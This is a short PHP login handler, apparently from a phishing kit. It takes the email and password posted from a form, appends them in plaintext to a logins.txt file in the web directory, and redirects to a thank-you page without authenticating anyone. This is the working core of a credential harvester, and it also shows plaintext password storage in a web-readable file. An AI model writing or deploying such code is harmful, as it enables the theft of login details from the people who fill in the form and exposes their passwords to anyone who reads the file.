<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Define the file path where you want to save the login details
    $file = __DIR__ . '/logins.txt'; // Saves in the same directory as login.php

    // Create a string to write to the file
    $content = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Attempt to write the login details to the file
    if (file_put_contents($file, $content, FILE_APPEND | LOCK_EX) === false) {
        // Display an error if writing to the file fails and log the error
        echo "Error: Unable to save login details.";
        error_log("Failed to write to file: " . error_get_last()['message']);
    } else {
        // Redirect to thank-you page after form submission
        header('Location: thank-you.html');
        exit();
    }
}
?>
